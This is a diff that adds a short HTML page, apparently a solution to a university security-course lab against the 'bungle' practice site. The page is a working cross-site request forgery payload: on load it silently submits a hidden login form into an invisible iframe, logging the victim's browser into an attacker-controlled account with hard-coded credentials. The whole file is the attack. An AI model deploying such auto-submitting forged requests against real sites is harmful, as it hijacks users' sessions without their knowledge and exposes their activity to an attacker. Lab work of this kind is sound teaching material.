@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+    <body onload="document.forms[0].submit()">
+        <iframe name="gun" style="display: none;"></iframe>
+            <form action="http://bungle-cs461.csl.illinois.edu/login?csrfdefense=0&xssdefense=5" method="post" target="gun">
+                <input type="hidden" name="username" value="attacker">
+                <input type="hidden" name="password" value="l33th4x">
+            </form>
+    </body>
+</html>
